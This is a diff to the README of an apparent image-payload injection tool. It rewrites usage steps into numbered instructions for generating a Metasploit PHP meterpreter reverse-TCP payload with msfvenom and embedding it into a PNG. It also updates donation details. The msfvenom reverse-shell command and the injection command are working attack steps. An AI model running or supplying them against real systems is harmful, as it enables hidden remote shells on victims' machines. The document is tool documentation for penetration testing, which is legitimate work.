@@ -27,12 +27,18 @@ both valid x86 shellcode and a valid image file, I recommend you to look
 
 #### msfvenom
 
-If you want to inject a metasploit payload, try something like this:
+If you want to inject a metasploit payload, you have to do something like this:
 
-```bash
-msfvenom -p php/meterpreter_reverse_tcp \
+1. Create metasploit payload (i.e. php).
+```sh
+$ msfvenom -p php/meterpreter_reverse_tcp \
 	LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php
-# Edit payload.php if need.
+```
+
+2. Edit `payload.php` if needed.
+
+3. Inject `payload.php` into the image (i.e. png).
+```sh
 ./pixload/png.pl -payload "$(cat payload.php)" -output payload.png
 ```
 
@@ -371,8 +377,9 @@ The author does not hold any responsibility for the bad use
 of this tool, remember that attacking targets without prior
 consent is illegal and punished by law.
 
-## DONATION
+## DONATIONS
 
-BTC: bc1qu7v2h9hq45cx5x0xgy4438ayn2z2ec4af50rdz
+BTC: `bc1qj4g98svq6qh3q2ap37v52nsvusa76c3cnmcdmx`
+PAYPAL: `alexandr.savca89@gmail.com`
 
-![btc-qrcode.png](btc-qrcode.png)
+Highly appreciated.
